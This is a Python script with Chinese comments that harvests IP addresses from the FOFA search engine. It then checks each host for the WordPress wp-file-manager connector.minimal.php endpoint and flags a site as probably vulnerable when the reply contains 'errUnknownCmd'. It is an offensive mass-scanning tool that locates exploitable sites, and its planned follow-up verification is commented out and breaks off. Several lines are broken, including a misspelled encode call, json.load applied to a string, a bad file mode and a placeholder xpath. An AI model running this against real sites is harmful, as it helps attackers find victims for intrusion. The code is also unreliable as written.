import json,requests,base64,time,sys
from typing_extensions import Concatenate
from lxml import etree
## 提取IP
def fofa_search(search_data,page):
    ## search wordpress url
    headers = {
        'cookie':'_fofapro_ars_session=own_cookie'
    }

    for page_number in range (1,page+1):
        url = 'https://fofa.so/result?...' + 'page_size' + str(page_number)

        search_data_bs = str(base64.b64encode(search_data.encod('utf-8')),"utf-8")

        urls = url +search_data_bs
        try:
            print('提取第' + str(page_number) +'页')
            result = requests.get(urls,headers=headers).content
            soup = etree.HTML(result)
            ip_data = soup.xpath('正则提取ip')

            ipdata = '\n'.join(ip_data)
            print(ip_data)
            with open(r'ip.txt','a++') as f:
                f.write(ipdata + '\n')
                f.close
            time.sleep(0.5)

        except Exception as e:
            pass
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/91.0.4472.124 Safari/537.36 "
}
url_tail = "/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
def check_vuln(url):
    url_2 = url + url_tail
    res1 = requests.get(url=url_2, headers=headers)
    text1 = res1.text
    text2 = json.load(text1)
    key = json.dumps(text2) # json转换为字符串

    print(text2)

    key1 = 'errUnknownCmd'

    if key1 in key:
        print('漏洞可能存在')
    ##    Next = input("进一步验证 Y or N :")

    ##    if Next == 'Y':
     ##       check

